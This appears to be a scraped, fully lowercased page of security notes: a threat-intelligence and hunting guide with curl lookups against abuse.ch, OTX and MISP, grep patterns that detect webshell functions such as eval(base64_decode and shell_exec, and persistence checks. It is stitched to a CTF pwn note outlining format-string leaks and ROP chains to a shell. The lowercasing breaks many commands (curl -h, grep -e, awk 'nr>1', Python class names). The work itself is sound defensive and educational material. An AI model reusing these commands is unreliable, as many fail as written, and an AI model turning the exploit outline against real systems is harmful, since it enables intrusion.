curl -s 'https://urlhaus-api.abuse.ch/v1/url/' \
  --data 'url=http%3a%2f%2fmalicious.example%2fpayload.exe' \
  | python3 -m json.tool | grep -e 'query_status|threat|url_status' # --- alienvault otx ---
otx_key='<your_otx_api_key>'

# look up an ip
curl -s "https://otx.alienvault.com/api/v1/indicators/ipv4/<ip>/general" \
  -h "x-otx-api-key: $otx_key" | python3 -m json.tool | grep -e 'pulse_count|country|asn'

# look up a domain
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<domain>/general" \
  -h "x-otx-api-key: $otx_key" | python3 -m json.tool

# subscribe to a pulse (threat campaign)
curl -s "https://otx.alienvault.com/api/v1/pulses/<pulse-id>" \
  -h "x-otx-api-key: $otx_key" \
  | python3 -c "
import json,sys
p=json.load(sys.stdin)
print(p['name'])
for ioc in p['indicators'][:20]:
    print(ioc['type'].ljust(20), ioc['indicator'])
"

# get your subscribed pulse feed (latest iocs)
curl -s 'https://otx.alienvault.com/api/v1/pulses/subscribed?modified_since=2026-05-01' \
  -h "x-otx-api-key: $otx_key" | python3 -m json.tool | grep 'indicator' ioc hunting in your environment consuming feeds is the first step. hunting them against your own logs and systems is where detection happens. # --- hunt c2 ips in local logs ---
# build a list from a feed, then grep logs
curl -s 'https://feodotracker.abuse.ch/downloads/ipblocklist.txt' \
  | grep -v '^#' > /tmp/c2_ips.txt

# check auth and syslog
while read ip; do
  hits=$(grep -c "$ip" /var/log/syslog /var/log/auth.log 2>/dev/null | grep -v ':0$')
  [ -n "$hits" ] && echo "hit: $ip -> $hits"
done < /tmp/c2_ips.txt

# check active connections right now
ss -tnp | awk '{print $5}' | cut -d: -f1 | sort -u > /tmp/current_ips.txt
comm -12 <(sort /tmp/c2_ips.txt) /tmp/current_ips.txt

# check dns query logs (if using systemd-resolved)
journalctl -u systemd-resolved --since '7 days ago' \
  | grep -ff /tmp/c2_domains.txt 2>/dev/null # --- hunt for malicious hashes on disk ---
# generate hashes of files in a directory
find /var/www /tmp /dev/shm -type f -exec sha256sum {} \; 2>/dev/null > /tmp/local_hashes.txt

# compare against a known-bad hash list
while read hash path; do
  if grep -qf "$hash" /tmp/known_bad_hashes.txt 2>/dev/null; then
    echo "match: $hash $path"
  fi
done < /tmp/local_hashes.txt

# batch check hashes via malwarebazaar
python3 - <<'eof'
import requests, json
hashes = open('/tmp/local_hashes.txt').read().split()
for h in hashes[:10]:  # rate limit
    r = requests.post('https://mb-api.abuse.ch/api/v1/',
                      data={'query':'get_info','hash':h})
    d = r.json()
    if d.get('query_status') == 'hash_found':
        print(f"malicious: {h} -> {d['data'][0].get('signature','unknown')}")
eof # --- hunt for webshells and post-exploitation artefacts ---

# recently dropped files (last 48h)
find /var/www /tmp /dev/shm /var/tmp -type f -newer /tmp -ls 2>/dev/null

# common webshell strings
grep -rel '(eval\(base64_decode|passthru\(|shell_exec\(|assert\(\$_|system\()' \
  /var/www/ 2>/dev/null

# php files with suspicious encoding
grep -rel '(base64_decode|gzinflate|str_rot13).*\$_(get|post|request|cookie)' \
  /var/www/ 2>/dev/null

# processes running from /tmp or /dev/shm (common fileless staging)
ls -la /proc/*/exe 2>/dev/null | grep -e '/tmp|/dev/shm|/var/tmp'

# processes with deleted binaries (fileless malware indicator)
for pid in /proc/[0-9]*; do
  exe=$(readlink "$pid/exe" 2>/dev/null)
  [[ "$exe" == *"(deleted)"* ]] && echo "deleted binary: $pid $exe"
done

# unexpected suid binaries (privilege escalation persistence)
find / -perm -4000 -type f 2>/dev/null | grep -ve '^/(usr|bin|sbin)' # --- persistence hunting ---

# cron jobs across all users
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -u "$user" -l 2>/dev/null | grep -v '^#' | sed "s/^/$user: /"
done
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null

# systemd service units added recently
find /etc/systemd /lib/systemd -name '*.service' \
  -newer /etc/systemd/system/multi-user.target -ls 2>/dev/null

# unexpected listening ports
ss -tlnp | awk 'nr>1 {print $4,$6}' | grep -v -e '(:22|:80|:443|:53|:25|127\.0\.0\.1)'

# ssh authorized_keys across all home dirs
find /home /root -name 'authorized_keys' -exec echo '=== {} ===' \; -exec cat {} \; stix & taxii – structured sharing **stix (structured threat information expression)** is the standard format for describing threat intelligence objects — indicators, malware, threat actors, campaigns, attack patterns — in a machine-readable json schema.

**taxii (trusted automated exchange of indicator information)** is the transport protocol for sharing stix data between organisations and platforms. # parse stix bundle and extract indicators
from stix2 import parse, filter
from taxii2client.v21 import server

# connect to a public taxii server (e.g. mitre att&ck)
server = server('https://cti-taxii.mitre.org/taxii/')
for api_root in server.api_roots:
    print(api_root.title)
    for collection in api_root.collections:
        print(' -', collection.title, collection.id)

# pull indicators from a taxii collection
collection_url = 'https://cti-taxii.mitre.org/stix/collections/<collection-id>/'
from taxii2client.v21 import collection
col = collection(collection_url)
bundle = col.get_objects()
for obj in bundle.get('objects', []):
    if obj['type'] == 'indicator':
        print(obj['name'], obj['pattern']) threat intelligence platforms (tips) a **tip** aggregates, correlates, and distributes intelligence across your tooling. key open-source options: # --- misp quick setup (docker) ---
git clone https://github.com/misp/misp-docker
cd misp-docker
cp template.env .env
docker compose up -d

# query misp api for indicators
curl -s 'https://misp.local/attributes/restsearch' \
  -h 'authorization: <auth-key>' \
  -h 'content-type: application/json' \
  --data '{"type": "ip-dst", "value": "185.220.101.5"}' \
  | python3 -m json.tool

# export misp event as stix2
curl -s 'https://misp.local/events/restsearch/returnformat:stix2' \
  -h 'authorization: <auth-key>' \
  --data '{"eventid": "123"}' | python3 -m json.tool real-world use cases **soc / detection engineering**
- ingest cisa kev daily; auto-ticket any internal asset running a vulnerable version via cmdb lookup
- subscribe to abuse.ch threatfox and push new c2 ips/domains into siem as dynamic blocklists
- correlate ja3 hashes from network taps against known cobalt strike/sliver fingerprints — catches c2 beacons regardless of ip rotation
- use greynoise to filter mass-scanner ips from alerts; only alert on traffic classified as **targeted** (not background noise)

**incident response**
- during ir, extract all ips/domains from malware samples via sandbox (any.run, cape) and retroactively hunt 90 days of proxy/dns logs
- hash every file in suspected staging directories and bulk-query malwarebazaar for instant family identification
- pivot from a single ioc: one c2 ip → find associated domains → find other hashes → find other campaigns using same infrastructure

**threat hunting**
- schedule weekly hunts: pull latest feodo c2 list, check against firewall flow data, alert on any match
- build a hypothesis from a threat report (e.g. "actor uses certutil for staging") → write a siem rule → hunt historically → refine ctf / challenge use cases # given a suspicious binary in a ctf forensics challenge:

# 1. get the hash
sha256sum suspicious.exe

# 2. check virustotal
curl -s "https://www.virustotal.com/api/v3/files/<hash>" \
  --header "x-apikey: $vt_key" | python3 -m json.tool | grep -e 'meaningful_name|malicious|family'

# 3. check malwarebazaar for sample + tags
curl -s 'https://mb-api.abuse.ch/api/v1/' \
  --data "query=get_info&hash=<hash>" | python3 -m json.tool

# 4. extract strings for manual ioc identification
strings suspicious.exe | grep -ie '(http|ftp|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|/[a-z]+/[a-z]+)'

# 5. check extracted domain against threatfox
curl -s 'https://threatfox-api.abuse.ch/api/v1/' \
  --data '{"query": "search_ioc", "search_term": "evil-c2.example.com"}'

# 6. find related infrastructure (passive dns)
curl -s "https://api.hackertarget.com/hostsearch/?q=evil-c2.example.com" | purpose | tool / feed |
|---------|-------------|
| exploited cves | cisa kev |
| hash / ip / domain lookup | virustotal, malwarebazaar |
| c2 ip blocklists | abuse.ch feodo |
| malware urls | urlhaus |
| multi-type iocs with context | threatfox |
| community threat pulses | alienvault otx |
| mass-scan filtering | greynoise |
| ttp framework | mitre att&ck |
| self-hosted tip | misp, opencti |
| passive dns / pivot | hackertarget.com, securitytrails |

**golden rule:** block on hash/ip for quick wins. detect on ttps to stay ahead of the next campaign. a ja3 detection of cobalt strike's default tls fingerprint outlasts any blocklist.

title: CTF Notes — Patterns That Come Up Every Time
summary: Not a walkthrough — a pattern library. The specific techniques that reappear across pwn, web, crypto, and forensics challenges often enough that recognising the
body:
ctf notes — patterns that come up every time not a walkthrough — a pattern library. the specific techniques that reappear across pwn, web, crypto, and forensics challenges often enough that recognising them on sight, rather than re-deriving them, is what actually separates a fast solve from a slow one. notes ctf pwn web crypto forensics every ctf category has a long tail of novel techniques and a short list of patterns that account for most points scored. this is the short list — the things worth recognising instantly rather than rediscovering mid-challenge. pwn **always run `checksec` first.** it tells you which technique class even applies before you read a single line of disassembly. **the recurring chain when everything's enabled (canary + nx + pie + full relro):** leak a stack canary or a libc address via a format-string bug or an info leak, compute the libc base from that leak, then build a rop chain that calls `system("/bin/sh")` or returns into `one_gadget` — a single libc offset that pops a shell if rsp happens to satisfy its constraint, found instantly with the `one_gadget` tool against the leaked libc.

**format string bugs are a leak primitive, not just a crash.** `printf(user_input)` with no format specifier lets you read stack memory with `%p`/`%x` (leak canary, return addresses) and write arbitrary memory with `%n` variants — recognise `printf`/`sprintf`/`fprintf` called directly on unsanitised input as a free leak before looking for anything else. checksec --file=./binary
